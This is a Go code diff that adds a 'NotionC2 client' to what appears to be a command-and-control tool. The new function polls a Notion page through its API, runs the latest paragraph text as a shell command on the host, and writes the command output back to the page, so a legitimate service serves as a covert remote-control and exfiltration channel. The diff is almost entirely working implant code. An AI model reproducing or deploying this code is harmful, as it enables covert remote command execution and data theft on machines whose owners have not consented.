@@ -22,7 +22,7 @@ var (
 	cmd          string
 )
 
-func main() {
+func github_logic() {
 	owner = os.Args[1]
 	repo_name = os.Args[2]
 	access_token = os.Args[3]
@@ -115,4 +115,105 @@ func main() {
 		}
 	}
 
+}
+
+func notion_logic() {
+	var integeration_token string
+	var page_id string
+	var prev_command string = ""
+	var output map[string]interface{}
+
+	integeration_token = os.Args[1]
+	page_id = os.Args[2]
+
+	url := "https://api.notion.com/v1/blocks/" + page_id + "/children"
+	fmt.Println("[+] NotionC2 client started.")
+	for {
+		time.Sleep(5 * time.Second)
+
+		req1, _ := http.NewRequest("GET", url, nil)
+
+		req1.Header.Add("Notion-Version", "2022-06-28")
+		req1.Header.Add("Authorization", "Bearer "+integeration_token)
+
+		res, err2 := http.DefaultClient.Do(req1)
+
+		if err2 != nil {
+			fmt.Println("[-] Error in reading from the notion page")
+		}
+		body, _ := io.ReadAll(res.Body)
+		json.Unmarshal(body, &output)
+
+		blocks := output["results"].([]interface{})
+		if len(blocks) == 0 {
+			fmt.Println("[-] No Command")
+			continue
+		}
+		block := blocks[len(blocks)-1].(map[string]interface{})
+		if block["type"] == "paragraph" {
+			paragraph := block["paragraph"].(map[string]interface{})
+			rich := paragraph["rich_text"].([]interface{})
+			//jsonData, _ := json.MarshalIndent(rich, "", "  ")
+			//fmt.Println(string(jsonData))
+			if len(rich) == 0 {
+				fmt.Println("[-] No Command")
+				continue
+			}
+			text := rich[0].(map[string]interface{})["text"].(map[string]interface{})["content"]
+			if text == prev_command {
+				fmt.Println("[!] No Command Received")
+				continue
+			}
+			fmt.Println("[+] Received Command : ", text)
+			tokens := strings.Fields(text.(string))
+			process := exec.Command(tokens[0], tokens[1:]...)
+			out, cmd_err := process.Output()
+
+			if cmd_err != nil {
+				fmt.Println("[+] Error in command execution")
+				out = []byte(cmd_err.Error())
+			} else {
+				fmt.Println("[+] Command Output : ", string(out))
+			}
+
+			payload := strings.NewReader(fmt.Sprintf(`{
+			"children": [
+				{
+				"object": "block",
+				"type": "paragraph",
+				"paragraph": {
+					"rich_text": [
+					{
+						"type": "text",
+						"text": { "content": "%s" }
+					}
+					]
+				}
+				}
+			]
+			}`, string(out)))
+			prev_command = string(out)
+
+			req, _ := http.NewRequest("PATCH", url, payload)
+
+			req.Header.Add("Notion-Version", "2022-06-28")
+			req.Header.Add("Authorization", "Bearer "+integeration_token)
+			req.Header.Add("Content-Type", "application/json")
+
+			_, err := http.DefaultClient.Do(req)
+
+			if err != nil {
+				fmt.Println("[-] Error in Writing Command")
+			} else {
+				fmt.Println("[+] successfully written to server")
+			}
+		} else {
+			fmt.Println("[-] Type is not Paragraph")
+		}
+	}
+
+}
+
+func main() {
+	notion_logic()
 }
